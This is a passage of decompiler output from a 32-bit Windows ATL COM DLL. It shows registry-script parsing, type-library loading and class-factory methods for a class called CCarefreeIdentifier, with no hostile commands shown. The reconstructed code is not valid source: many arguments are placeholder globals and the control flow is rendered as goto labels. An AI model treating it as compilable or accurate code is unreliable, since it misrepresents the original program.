    int16_t * v4 = (int16_t *)a1; // 0x10012c74
    if (*v4 == 125) {
        // 0x100132b1
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    // 0x10012c80
    int32_t v5; // bp-8732, 0x10012c00
    int32_t v6 = &v5;
    int32_t v7 = &v2;
    int32_t v8; // bp-540, 0x10012c00
    int32_t v9 = &v8;
    int32_t v10 = &v3; // 0x10012c00
    int32_t v11; // 0x10012c00
    int32_t v12; // 0x10012c00
    int32_t v13; // 0x10012c96
    int32_t v14; // 0x10012d3b
    while (true) {
      lab_0x10012c80:;
        int32_t v15 = v10;
        *(int32_t *)(v15 - 4) = (int32_t)L"Delete";
        *(int32_t *)(v15 - 8) = a1;
        v13 = lstrcmpiW((int16_t *)1, (int16_t *)&g173);
        *(int32_t *)(v15 - 12) = (int32_t)L"ForceRemove";
        int32_t v16 = v15 - 16; // 0x10012ca1
        *(int32_t *)v16 = a1;
        int32_t v17 = lstrcmpiW((int16_t *)&g173, (int16_t *)&g173); // 0x10012ca3
        v12 = v16;
        if (v13 != 0 == (v17 != 0)) {
            goto lab_0x10012dfd;
        } else {
            int32_t v18 = v15 - 20; // 0x10012cb7
            *(int32_t *)v18 = a1;
            int32_t v19 = function_100111c0((int32_t)&g173); // 0x10012cb8
            v11 = v18;
            if (v19 < 0) {
                // break -> 0x1001329e
                break;
            }
            // 0x10012cc7
            v12 = v18;
            if (a3 == 0) {
                goto lab_0x10012dfd;
            } else {
                int16_t v20 = *v4; // 0x10012cd2
                int16_t v21 = v20; // 0x10012cec
                int32_t v22 = v18; // 0x10012cec
                int32_t v23 = v18; // 0x10012cec
                if (v20 != 0) {
                    int32_t v24 = v22;
                    int32_t v25 = a1;
                    while (v21 != 92) {
                        int32_t v26 = v24 - 4; // 0x10012cfa
                        *(int32_t *)v26 = v25;
                        int16_t * v27 = CharNextW((int16_t *)&g173); // 0x10012cfb
                        int16_t v28 = *v27; // 0x10012cfd
                        int32_t v29 = (int32_t)v27; // 0x10012d03
                        v21 = v28;
                        v22 = v26;
                        v23 = v26;
                        if (v28 == 0) {
                            goto lab_0x10012d0f;
                        }
                        v24 = v22;
                        v25 = v29;
                    }
                    // 0x10012d07
                    v23 = v24;
                    if (v25 != 0) {
                        // 0x10013276
                        function_10011500();
                        // 0x10013281
                        function_10011500();
                        goto lab_0x100132b1;
                    }
                }
              lab_0x10012d0f:;
                int32_t v30 = &g10;
                int32_t v31 = v23;
                *(int32_t *)(v31 - 4) = *(int32_t *)v30;
                int32_t v32 = v31 - 8; // 0x10012d17
                *(int32_t *)v32 = a1;
                int32_t v33 = lstrcmpiW((int16_t *)&g173, (int16_t *)&g173); // 0x10012d18
                v14 = v32;
                while (v33 != 0) {
                    int32_t v34 = v30 + 4; // 0x10012d22
                    if (v34 >= (int32_t)"RegOpenKeyTransactedW") {
                        // 0x10012d2d
                        v14 = v31 - 12;
                        *(int32_t *)v14 = a1;
                        function_10011520(a2);
                        goto lab_0x10012d65;
                    }
                    v30 = v34;
                    v31 = v32;
                    *(int32_t *)(v31 - 4) = *(int32_t *)v30;
                    v32 = v31 - 8;
                    *(int32_t *)v32 = a1;
                    v33 = lstrcmpiW((int16_t *)&g173, (int16_t *)&g173);
                    v14 = v32;
                }
                goto lab_0x10012d65;
            }
        }
    }
    goto lab_0x1001329e_14;
  lab_0x10013299_2:
    // 0x10013299
    function_10011500();
    int32_t v35; // 0x10012c00
    v11 = v35;
    goto lab_0x1001329e_14;
  lab_0x100132e7_2:;
    // 0x100132e7
    int32_t v36; // 0x10012c00
    int32_t v37; // 0x10012c00
    *(int32_t *)(v37 - 4) = v36;
    function_10010aa0((int32_t)&g173);
    v35 = v37;
    goto lab_0x10013299_2;
  lab_0x10012dfd:;
    int32_t v38 = v12;
    *(int32_t *)(v38 - 4) = (int32_t)L"NoRemove";
    int32_t v39 = v38 - 8; // 0x10012e02
    *(int32_t *)v39 = a1;
    int32_t v40 = lstrcmpiW((int16_t *)&g173, (int16_t *)&g173); // 0x10012e03
    int32_t v41 = 1; // 0x10012e0b
    int32_t v42 = v39; // 0x10012e0b
    if (v40 == 0) {
        int32_t v43 = v38 - 12; // 0x10012e13
        *(int32_t *)v43 = a1;
        int32_t v44 = function_100111c0(v40); // 0x10012e1a
        v41 = v40;
        v42 = v43;
        v11 = v43;
        if (v44 < 0) {
            // break -> 0x1001329e
            goto lab_0x1001329e_14;
        }
    }
    int32_t v45 = v42;
    int32_t v46 = v41;
    *(int32_t *)(v45 - 4) = (int32_t)L"Val";
    int32_t v47 = v45 - 8; // 0x10012e2e
    *(int32_t *)v47 = a1;
    int32_t v48; // 0x10012c00
    int32_t v49; // 0x10012c00
    int32_t v50; // 0x10012c00
    int32_t v51; // 0x10012c00
    int32_t v52; // 0x10012c00
    int32_t v53; // 0x10012c00
    int32_t v54; // 0x10012c00
    if (lstrcmpiW((int16_t *)&g173, (int16_t *)&g173) != 0) {
        int16_t v55 = *v4; // 0x10012f78
        int16_t v56 = v55; // 0x10012f80
        int32_t v57 = v47; // 0x10012f80
        int32_t v58 = v47; // 0x10012f80
        if (v55 != 0) {
            int32_t v59 = v57;
            int32_t v60 = a1;
            while (v56 != 92) {
                int32_t v61 = v59 - 4; // 0x10012f88
                *(int32_t *)v61 = v60;
                int16_t * v62 = CharNextW((int16_t *)&g173); // 0x10012f89
                int16_t v63 = *v62; // 0x10012f8f
                int32_t v64 = (int32_t)v62; // 0x10012f95
                v56 = v63;
                v57 = v61;
                v58 = v61;
                if (v63 == 0) {
                    goto lab_0x10012fa1;
                }
                v59 = v57;
                v60 = v64;
            }
            // 0x10012f99
            v58 = v59;
            if (v60 != 0) {
                // 0x10013281
                function_10011500();
                goto lab_0x100132b1;
            }
        }
      lab_0x10012fa1:;
        int32_t v65 = v58;
        if (a3 == 0) {
            // 0x10013043
            v53 = 2;
            v48 = v65;
            if (a4 != 0) {
                goto lab_0x1001306d;
            } else {
                // 0x10013049
                *(int32_t *)(v65 - 4) = 0x20019;
                *(int32_t *)(v65 - 8) = a1;
                int32_t v66 = v65 - 12; // 0x10013055
                *(int32_t *)v66 = a2;
                int32_t v67 = function_10010d50((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x1001305c
                v53 = v67;
                v48 = v66;
                v52 = a4;
                v54 = 0;
                v49 = v66;
                if (v67 == 0) {
                    goto lab_0x10013074;
                } else {
                    goto lab_0x1001306d;
                }
            }
        } else {
            // 0x10012fab
            *(int32_t *)(v65 - 4) = 0x2001f;
            *(int32_t *)(v65 - 8) = a1;
            int32_t v68 = v65 - 12; // 0x10012fb7
            *(int32_t *)v68 = a2;
            int32_t v69 = function_10010d50((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10012fbe
            int32_t v70 = v68; // 0x10012fc5
            if (v69 != 0) {
                // 0x10012fc7
                *(int32_t *)(v65 - 16) = 0x20019;
                *(int32_t *)(v65 - 20) = a1;
                int32_t v71 = v65 - 24; // 0x10012fcd
                *(int32_t *)v71 = a2;
                int32_t v72 = function_10010d50((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10012fd4
                v70 = v71;
                if (v72 != 0) {
                    // 0x10012fdd
                    *(int32_t *)(v65 - 28) = 0;
                    *(int32_t *)(v65 - 32) = 0;
                    *(int32_t *)(v65 - 36) = 0x2001f;
                    *(int32_t *)(v65 - 40) = 0;
                    *(int32_t *)(v65 - 44) = 0;
                    *(int32_t *)(v65 - 48) = a1;
                    int32_t v73 = v65 - 52; // 0x10012feb
                    *(int32_t *)v73 = a2;
                    int32_t v74 = function_10010cb0((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10012ff2
                    v70 = v73;
                    if (v74 != 0) {
                        // 0x100132fa
                        function_10011500();
                        *(int32_t *)(v65 - 56) = v74;
                        function_10010aa0((int32_t)&g173);
                        goto lab_0x100132b1;
                    }
                }
            }
            int32_t v75 = v70;
            int32_t v76 = v75 - 4; // 0x10013007
            *(int32_t *)v76 = a1;
            int32_t v77 = function_100111c0((int32_t)&g173); // 0x1001300a
            v11 = v76;
            if (v77 < 0) {
                // break -> 0x1001329e
                goto lab_0x1001329e_14;
            }
            // 0x10013019
            v50 = v76;
            if (*v4 == 61) {
                // 0x10013023
                *(int32_t *)(v75 - 8) = a1;
                *(int32_t *)(v75 - 12) = 0;
                int32_t v78 = v75 - 16; // 0x1001302c
                *(int32_t *)v78 = v7;
                int32_t v79 = function_10012880((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x1001302f
                v50 = v78;
                v11 = v78;
                if (v79 < 0) {
                    // break -> 0x1001329e
                    goto lab_0x1001329e_14;
                }
            }
            goto lab_0x10012da1;
        }
    } else {
        int32_t v80 = v45 - 12; // 0x10012e49
        *(int32_t *)v80 = v6;
        int32_t v81 = function_100111c0((int32_t)&g173); // 0x10012e4a
        v11 = v80;
        if (v81 < 0) {
            // break -> 0x1001329e
            goto lab_0x1001329e_14;
        }
        int32_t v82 = v45 - 16; // 0x10012e5f
        *(int32_t *)v82 = a1;
        int32_t v83 = function_100111c0((int32_t)&g173); // 0x10012e60
        v11 = v82;
        if (v83 < 0) {
            // break -> 0x1001329e
            goto lab_0x1001329e_14;
        }
        // 0x10012e6f
        if (*v4 != 61) {
            // 0x10013281
            function_10011500();
            goto lab_0x100132b1;
        }
        if (a3 == 0) {
            int32_t v84 = v82; // 0x10012ee9
            if (a4 == 0 && v46 != 0) {
                // 0x10012ef3
                *(int32_t *)(v45 - 20) = 0x20006;
                *(int32_t *)(v45 - 24) = 0;
                int32_t v85 = v45 - 28; // 0x10012eff
                *(int32_t *)v85 = a2;
                int32_t v86 = function_10010d50(0, 0, 0); // 0x10012f18
                v36 = v86;
                v37 = v85;
                if (v86 != 0) {
                    goto lab_0x100132e7_2;
                }
                // 0x10012f25
                *(int32_t *)(v45 - 32) = v6;
                int32_t v87 = v45 - 36; // 0x10012f32
                *(int32_t *)v87 = 0;
                int32_t v88 = RegDeleteValueW(&g173, (int16_t *)&g173); // 0x10012f33
                v84 = v87;
                v36 = v88;
                v37 = v87;
                if (v88 != 0 == (v88 != 2)) {
                    goto lab_0x100132e7_2;
                }
            }
            int32_t v89 = v84 - 4; // 0x10012f63
            *(int32_t *)v89 = a1;
            int32_t v90 = function_100113c0((int32_t)&g173); // 0x10012f64
            v51 = v89;
            v11 = v89;
            if (v90 < 0) {
                // break -> 0x1001329e
                goto lab_0x1001329e_14;
            }
            goto lab_0x10012de4;
        } else {
            // 0x10012e80
            *(int32_t *)(v45 - 20) = a1;
            *(int32_t *)(v45 - 24) = v6;
            int32_t v91 = v45 - 28; // 0x10012e9a
            int32_t v92; // bp-8788, 0x10012c00
            *(int32_t *)v91 = (int32_t)&v92;
            v92 = a2;
            v92 = 0;
            v50 = v91;
            if (function_10012880(a2, 0, 0) < 0) {
                // 0x100132cf
                function_10011500();
                function_10011500();
                goto lab_0x100132b1;
            }
            goto lab_0x10012da1;
        }
    }
  lab_0x10012d65:;
    int32_t v93 = v14;
    v12 = v93;
    if (v13 != 0) {
        goto lab_0x10012dfd;
    } else {
        int32_t v94 = v93 - 4; // 0x10012d73
        *(int32_t *)v94 = a1;
        int32_t v95 = function_100111c0((int32_t)&g173); // 0x10012d76
        v35 = v94;
        if (v95 < 0) {
            goto lab_0x10013299_2;
        }
        int32_t v96 = v93 - 8; // 0x10012d85
        *(int32_t *)v96 = a1;
        int32_t v97 = function_100113c0((int32_t)&g173); // 0x10012d88
        v50 = v96;
        v35 = v96;
        if (v97 < 0) {
            goto lab_0x10013299_2;
        }
        goto lab_0x10012da1;
    }
  lab_0x1001306d:
    // 0x1001306d
    v52 = 1;
    v54 = v53;
    v49 = v48;
    goto lab_0x10013074;
  lab_0x10012da1:;
    int32_t v137 = v50;
    v51 = v137;
    if (*v4 == 123) {
        int32_t v138 = v137 - 4; // 0x10012da7
        *(int32_t *)v138 = a1;
        int32_t v139 = lstrlenW((int16_t *)&g173); // 0x10012da8
        v51 = v138;
        if (v139 == 1) {
            // 0x10012db3
            *(int32_t *)(v137 - 8) = 0;
            *(int32_t *)(v137 - 12) = a3;
            *(int32_t *)(v137 - 16) = v2;
            *(int32_t *)(v137 - 20) = a1;
            int32_t v140 = function_10012c00((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10012dc3
            if (v140 < 0) {
                // break -> 0x1001329e
                goto lab_0x1001329e_14;
            }
            int32_t v141 = v137 - 24; // 0x10012dd2
            *(int32_t *)v141 = a1;
            int32_t v142 = function_100111c0((int32_t)&g173); // 0x10012dd5
            v51 = v141;
            v11 = v141;
            if (v142 < 0) {
                // break -> 0x1001329e
                goto lab_0x1001329e_14;
            }
        }
    }
    goto lab_0x10012de4;
  lab_0x10012de4:
    // 0x10012de4
    v10 = v51;
    v11 = v51;
    if (*v4 == 125) {
        // break -> 0x1001329e
        goto lab_0x1001329e_14;
    }
    goto lab_0x10012c80;
  lab_0x10013074:;
    int32_t v98 = v49;
    int32_t v99 = v54;
    int32_t v100 = v52;
    int32_t v101 = v98 - 4;
    int32_t * v102 = (int32_t *)v101;
    *v102 = -1;
    int32_t v103 = v98 - 8; // 0x10013076
    int32_t * v104 = (int32_t *)v103;
    *v104 = a1;
    int32_t v105 = v98 - 12; // 0x1001307d
    int32_t * v106 = (int32_t *)v105; // 0x1001307d
    *v106 = 260;
    int32_t * v107 = (int32_t *)(v98 - 16); // 0x10013082
    *v107 = v9;
    int32_t v108 = _wcsncpy_s((int16_t *)&g173, (int32_t)&g173, (int16_t *)&g173, (int32_t)&g173); // 0x10013083
    g175 = v108;
    int32_t * v109 = v102; // 0x1001309b
    int32_t v110 = v101; // 0x1001309b
    switch (v108) {
        case 0: {
            goto lab_0x100130b4;
        }
        case 12: {
            // 0x10013310
            *v102 = -0x7ff8fff2;
            function_100108b0((int32_t)&g173);
            v109 = v104;
            v110 = v103;
            goto lab_0x1001331a;
        }
        case 22: {
            goto lab_0x1001331a;
        }
        case 34: {
            goto lab_0x1001331a;
        }
        case 80: {
            goto lab_0x100130b4;
        }
        default: {
            // 0x10013353
            *v102 = -0x7fffbffb;
            return function_100108b0((int32_t)&g173);
        }
    }
  lab_0x100130b4:
    // 0x100130b4
    *v102 = a1;
    int32_t v111 = function_100111c0((int32_t)&g173); // 0x100130bb
    v11 = v101;
    if (v111 < 0) {
        // break -> 0x1001329e
        goto lab_0x1001329e_14;
    }
    // 0x100130ca
    *v104 = a1;
    int32_t v112 = function_100113c0((int32_t)&g173); // 0x100130d1
    v11 = v103;
    if (v112 < 0) {
        // break -> 0x1001329e
        goto lab_0x1001329e_14;
    }
    int32_t v113 = v103; // 0x100130e4
    if (*v4 == 123) {
        // 0x100130e6
        *v106 = a1;
        int32_t v114 = lstrlenW((int16_t *)&g173); // 0x100130e7
        v113 = v105;
        if (v114 == 1) {
            // 0x100130f2
            *v107 = v100;
            *(int32_t *)(v98 - 20) = 0;
            *(int32_t *)(v98 - 24) = v2;
            int32_t v115 = v98 - 28; // 0x10013105
            *(int32_t *)v115 = a1;
            int32_t v116 = function_10012c00((int32_t)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10013106
            v11 = v115;
            if (v100 == 0 == v116 < 0) {
                // break -> 0x1001329e
                goto lab_0x1001329e_14;
            }
            int32_t v117 = v98 - 32; // 0x1001311f
            *(int32_t *)v117 = a1;
            int32_t v118 = function_100111c0((int32_t)&g173); // 0x10013120
            v113 = v117;
            v11 = v117;
            if (v118 < 0) {
                // break -> 0x1001329e
                goto lab_0x1001329e_14;
            }
        }
    }
    int32_t v119 = v113;
    v51 = v119;
    int32_t v120; // 0x10012c00
    int32_t v121; // 0x10013163
    switch (v99) {
        case 2: {
            goto lab_0x10012de4;
        }
        case 0: {
            // 0x10013163
            v121 = v2;
            v120 = v119;
            if (a4 == 0) {
                goto lab_0x100131bb;
            } else {
                // 0x1001316d
                *(int32_t *)(v119 - 4) = v121;
                if (function_10011370(a4) == 0) {
                    goto lab_0x100131bb;
                } else {
                    int32_t v122 = v119 - 8; // 0x10013189
                    *(int32_t *)v122 = v9;
                    int32_t v123 = function_10011330((int32_t)&g173); // 0x1001318a
                    v51 = v122;
                    if (v46 != 0 && v123 != 0) {
                        int32_t v124 = v119 - 12; // 0x100131aa
                        *(int32_t *)v124 = v9;
                        function_10011520((int32_t)&g173);
                        v51 = v124;
                    }
                    goto lab_0x10012de4;
                }
            }
        }
        default: {
            // 0x1001314b
            v51 = v119;
            if (a4 == 0) {
                // 0x10013153
                *(int32_t *)(v119 - 4) = v99;
                function_10010aa0(a4);
                v11 = v119;
                goto lab_0x1001329e_14;
            }
            goto lab_0x10012de4;
        }
    }
  lab_0x1001331a:
    // 0x1001331a
    *v109 = -0x7ff8ffa9;
    function_100108b0((int32_t)&g173);
    int32_t v125 = v99; // 0x1001331f
    int32_t v126 = v110; // 0x1001331f
  lab_0x10013324:
    // 0x10013324
    function_10011500();
    *(int32_t *)(v126 - 4) = v125;
    function_10010aa0((int32_t)&g173);
    // 0x100132b1
    __writefsdword(0, v1);
    return _40___security_check_cookie_40_4();
  lab_0x100131bb:;
    int32_t v127 = v120;
    int32_t v128 = v127 - 4; // 0x100131c1
    *(int32_t *)v128 = v121;
    int32_t hKey = function_10011370((int32_t)&g173); // 0x100131c2
    int32_t v129 = v128; // 0x100131d9
    int32_t v130 = 0; // 0x100131d9
    if (v121 != 0) {
        int32_t v131 = v127 - 8; // 0x100131db
        *(int32_t *)v131 = v121;
        int32_t v132 = RegCloseKey((int32_t *)hKey); // 0x100131dc
        v2 = 0;
        v129 = v131;
        v130 = v132;
        v125 = v132;
        v126 = v131;
        if (v132 != 0) {
            goto lab_0x10013324;
        }
    }
    int32_t v133 = v130;
    int32_t v134 = v129;
    v51 = v134;
    if (v46 != v133 && hKey == v133) {
        int32_t v135 = v134 - 4; // 0x10013234
        *(int32_t *)v135 = v9;
        int32_t v136 = function_10010c00(a2); // 0x10013247
        if (v136 != v133) {
            // 0x1001333d
            *(int32_t *)(v134 - 8) = v136;
            function_10010aa0(v133);
            v35 = v135;
            goto lab_0x10013299_2;
        }
        // 0x10013266
        function_10011500();
        v51 = v135;
    }
    goto lab_0x10012de4;
  lab_0x1001329e_14:
    // 0x1001329e
    if (v2 != 0) {
        // 0x100132a8
        *(int32_t *)(v11 - 4) = v2;
        RegCloseKey(&g173);
    }
  lab_0x100132b1:
    // 0x100132b1
    __writefsdword(0, v1);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100133d0 - 0x10013639
int32_t function_100133d0(int32_t a1, int32_t a2) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x100133e0
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // 0x100133d0
    int32_t * v3 = (int32_t *)(v2 + 12); // 0x10013402
    if (*v3 != 0) {
        // 0x10013407
        if (*(int32_t *)(v2 + 20) != 0) {
            // 0x1001361b
            __writefsdword(0, v1);
            return _40___security_check_cookie_40_4();
        }
    }
    int32_t v4 = g94 + 16; // 0x10013418
    struct _RTL_CRITICAL_SECTION * lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)v4; // 0x10013421
    struct _RTL_CRITICAL_SECTION * v5 = lpCriticalSection; // bp-584, 0x10013421
    EnterCriticalSection(lpCriticalSection);
    int32_t v6 = *v3;
    int32_t v7; // 0x100133d0
    int32_t v8; // 0x100133d0
    int32_t v9; // 0x100133d0
    int32_t v10; // 0x100133d0
    int32_t v11; // bp-544, 0x100133d0
    int32_t v12; // bp-556, 0x100133d0
    int32_t v13; // bp-596, 0x100133d0
    int16_t * v14; // bp-604, 0x100133d0
    int32_t v15; // 0x10013440
    if (v6 != 0) {
        // 0x100135f4
        v7 = v6;
        v10 = (int32_t)&v5;
        goto lab_0x100135f6;
    } else {
        // 0x10013440
        v15 = *(int32_t *)(v2 + 4);
        v12 = 0;
        if (g95 != *(int32_t *)v15) {
            goto lab_0x100134e0;
        } else {
            // 0x10013457
            if (g96 != *(int32_t *)(v15 + 4)) {
                goto lab_0x100134e0;
            } else {
                // 0x10013462
                if (g97 != *(int32_t *)(v15 + 8)) {
                    goto lab_0x100134e0;
                } else {
                    // 0x1001346d
                    if (g98 != *(int32_t *)(v15 + 12)) {
                        goto lab_0x100134e0;
                    } else {
                        // 0x10013478
                        if (*(int16_t *)(v2 + 8) != -1) {
                            goto lab_0x100134e0;
                        } else {
                            // 0x10013483
                            if (*(int16_t *)(v2 + 10) != -1) {
                                goto lab_0x100134e0;
                            } else {
                                // 0x1001348b
                                v13 = g141;
                                int32_t lpFilename; // bp-540, 0x100133d0
                                int32_t v16 = GetModuleFileNameW((int32_t *)g141, (int16_t *)&lpFilename, 260); // 0x1001349e
                                v9 = &v13;
                                switch (v16) {
                                    case 260: {
                                        goto lab_0x100135f6_2;
                                    }
                                    case 0: {
                                        goto lab_0x100135f6_2;
                                    }
                                    default: {
                                        // 0x100134b7
                                        v14 = (int16_t *)&lpFilename;
                                        v11 = 0;
                                        int32_t v17 = LoadTypeLib((int16_t *)&lpFilename, (int32_t **)&v12); // 0x100134cb
                                        function_100114a0();
                                        v8 = v17;
                                        goto lab_0x100134fe;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x100135f6:;
    int32_t v18 = v10; // 0x100135fb
    if (v7 != 0) {
        // 0x100135fd
        v18 = v10;
        if (*(int32_t *)(v2 + 20) == 0) {
            int32_t v19 = v10 - 4; // 0x10013602
            *(int32_t *)v19 = v7;
            function_10012120((int32_t)&g173);
            v18 = v19;
        }
    }
    // 0x1001360c
    *(int32_t *)(v18 - 4) = v4;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g173);
    // 0x1001361b
    __writefsdword(0, v1);
    return _40___security_check_cookie_40_4();
  lab_0x100134e0:;
    uint16_t v20 = *(int16_t *)(v2 + 10); // 0x100134ea
    v13 = v20;
    v14 = (int16_t *)v15;
    int32_t v21 = LoadRegTypeLib(v15, *(int16_t *)(v2 + 8), v20, a1, (int32_t **)&v12); // 0x100134f6
    v8 = v21;
    goto lab_0x100134fe;
  lab_0x100134fe:
    // 0x100134fe
    v9 = (int32_t)&v14;
    if (v8 >= 0) {
        int32_t v22 = 0; // bp-548, 0x10013506
        int32_t v23 = *(int32_t *)v12; // 0x10013512
        int32_t v24 = v12; // bp-616, 0x1001351e
        int32_t v25 = &v24; // 0x1001351e
        int32_t v26 = v25; // 0x1001352c
        if (*(int32_t *)(v23 + 24) >= 0) {
            // 0x10013583
            v11 = 0;
            int32_t v27 = &v11; // 0x1001355e
            *(int32_t *)(v25 - 4) = v27;
            *(int32_t *)(v25 - 8) = (int32_t)&g17;
            *(int32_t *)(v25 - 12) = 0;
            *(int32_t *)(v25 - 16) = v27;
            function_100125e0(v24, v23, &v22);
            *v3 = 0;
            int32_t v28 = v25 - 24; // 0x10013593
            *(int32_t *)v28 = 0x100122f0;
            function_10012640(0, (int32_t)&g173);
            v26 = v28;
            if (v11 != 0) {
                int32_t v29 = v25 - 28; // 0x100135b3
                *(int32_t *)v29 = v11;
                v26 = v29;
            }
        }
        int32_t v30 = v26 - 4; // 0x100135da
        *(int32_t *)v30 = v12;
        v9 = v30;
        if (v22 != 0) {
            int32_t v31 = v26 - 8; // 0x100135ef
            *(int32_t *)v31 = v22;
            v9 = v31;
        }
    }
    goto lab_0x100135f6_2;
  lab_0x100135f6_2:
    // 0x100135f6
    v7 = *v3;
    v10 = v9;
    goto lab_0x100135f6;
}

// Address range: 0x10013640 - 0x1001366c
// From class:    .?AV?$CComObjectCached@VCComClassFactory@ATL@@@ATL@@
// Type:          virtual member function
int32_t function_10013640(int32_t a1) {
    // 0x10013640
    return InterlockedIncrement((int32_t *)(a1 + 4));
}

// Address range: 0x10013670 - 0x100136b9
// From class:    .?AV?$CComObjectCached@VCComClassFactory@ATL@@@ATL@@
// Type:          virtual member function
int32_t function_10013670(int32_t a1) {
    // 0x10013670
    return InterlockedDecrement((int32_t *)(a1 + 4));
}

// Address range: 0x100136c0 - 0x100136dd
// From class:    .?AV?$CComObjectCached@VCComClassFactory@ATL@@@ATL@@
// Type:          virtual member function
int32_t function_100136c0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x100136c0
    int32_t v1; // 0x100136c0
    return function_10011f90(a1, &g21, a2, a3, v1);
}

// Address range: 0x100136e0 - 0x1001371d
// From class:    .?AV?$CComObjectCached@VCComClassFactory@ATL@@@ATL@@
// Type:          virtual member function
int32_t function_100136e0(char a1) {
    // 0x100136e0
    int32_t result; // 0x100136e0
    *(int32_t *)(result + 4) = -0x3fffffff;
    *(int32_t *)result = (int32_t)&g12;
    char * v1 = (char *)(result + 32); // 0x100136f6
    if (*v1 != 0) {
        // 0x100136fc
        *v1 = 0;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)(result + 8));
    }
    if ((a1 & 1) != 0) {
        // 0x1001370d
        _3f__3f_3_40_YAXPAX_40_Z(&g173);
    }
    // 0x10013716
    return result;
}

// Address range: 0x10013720 - 0x10013801
int32_t function_10013720(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10013730
    __writefsdword(0, (int32_t)&v1);
    if (a2 == 0) {
        // 0x10013750
        __writefsdword(0, v1);
        return -0x7fffbffd;
    }
    // 0x10013769
    *(int32_t *)a2 = 0;
    int32_t v2 = _3f__3f_2_40_YAPAXI_40_Z(12); // 0x10013780
    int32_t result = -0x7ff8fff2; // 0x1001378c
    if (v2 != 0) {
        // 0x100137bd
        *(int32_t *)(v2 + 8) = 0;
        int32_t * v3 = (int32_t *)v2;
        *v3 = (int32_t)&g14;
        *(int32_t *)(v2 + 4) = (int32_t)&g13;
        result = *v3;
    }
    // 0x100137eb
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x10013810 - 0x10013820
// From class:    .?AV?$CComAggObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10013810(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 4); // 0x10013816
    int32_t result = *v1 + 1; // 0x10013816
    *v1 = result;
    return result;
}

// Address range: 0x10013820 - 0x10013843
// From class:    .?AV?$CComAggObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10013820(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 4); // 0x10013826
    int32_t result = *v1 - 1; // 0x10013826
    *v1 = result;
    return result;
}

// Address range: 0x10013850 - 0x100138b8
// From class:    .?AV?$CComAggObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10013850(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10013850
    if (a3 == 0) {
        // 0x1001385a
        return -0x7fffbffd;
    }
    int32_t * v1 = (int32_t *)a3; // 0x10013869
    *v1 = 0;
    if (*(int32_t *)a2 != 0 || *(int32_t *)(a2 + 4) != 0 || *(int32_t *)(a2 + 8) != 192 || *(int32_t *)(a2 + 12) != 0x46000000) {
        // 0x1001389e
        int32_t v2; // 0x10013850
        return function_10011f90(a1 + 8, &g15, a2, a3, v2);
    }
    // 0x1001388a
    *v1 = a1;
    return 0;
}

// Address range: 0x100138c0 - 0x100138f6
// From class:    .?AV?$CComAggObject@VCCarefreeIdentifier@@@ATL@@
// Type:          constructor
int32_t function_100138c0(char a1) {
    // 0x100138c0
    int32_t result; // 0x100138c0
    *(int32_t *)result = (int32_t)&g23;
    *(int32_t *)(result + 4) = -0x3fffffff;
    if ((a1 & 1) != 0) {
        // 0x100138e6
        _3f__3f_3_40_YAXPAX_40_Z(&g173);
    }
    // 0x100138ef
    return result;
}

// Address range: 0x10013900 - 0x10013a73
int32_t function_10013900(int32_t a1, int32_t a2) {
    // 0x10013900
    __chkstk();
    if (function_10011a50(0, (int32_t)&g173) < 0) {
        // 0x10013a15
        return _40___security_check_cookie_40_4();
    }
    // 0x10013941
    int32_t v1; // 0x10013900
    *(int32_t *)v1 = 0;
    abort();
    // UNREACHABLE
}

// Address range: 0x10013aa0 - 0x10013bb4
int32_t function_10013aa0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x10013aa0
    int32_t v1; // 0x10013aa0
    int32_t * v2 = (int32_t *)(v1 + 12); // 0x10013aae
    int32_t * v3; // 0x10013aa0
    int32_t * v4; // 0x10013aa0
    if (*v2 == 0) {
        goto lab_0x10013ac1;
    } else {
        int32_t * v5 = (int32_t *)(v1 + 20);
        v3 = v5;
        int32_t v6; // bp-20, 0x10013aa0
        v4 = &v6;
        if (*v5 != 0) {
            goto lab_0x10013acb;
        } else {
            goto lab_0x10013ac1;
        }
    }
  lab_0x10013ac1:;
    int32_t v7 = a3; // bp-24, 0x10013abb
    int32_t v8; // 0x10013aa0
    int32_t result = function_100133d0(a3, v8); // 0x10013abc
    if (*v2 == 0) {
        // 0x10013b93
        return result;
    }
    // 0x10013ac1
    v3 = (int32_t *)(v1 + 20);
    v4 = &v7;
    goto lab_0x10013acb;
  lab_0x10013acb:;
    int32_t v9 = (int32_t)v4;
    int32_t v10 = v9 - 8; // 0x10013ad4
    if (!((a2 != 1 | *v3 == 0))) {
        int32_t * v11 = (int32_t *)a1; // 0x10013ae4
        int32_t v12 = v9 - 12; // 0x10013ae6
        *(int32_t *)v12 = *v11;
        int32_t v13 = lstrlenW((int16_t *)&g173); // 0x10013ae7
        int32_t v14 = *(int32_t *)(v1 + 24) - 1; // 0x10013af0
        v10 = v12;
        if (v14 >= 0) {
            int32_t v15 = *v3; // 0x10013afa
            int32_t v16 = 12 * v14; // 0x10013b02
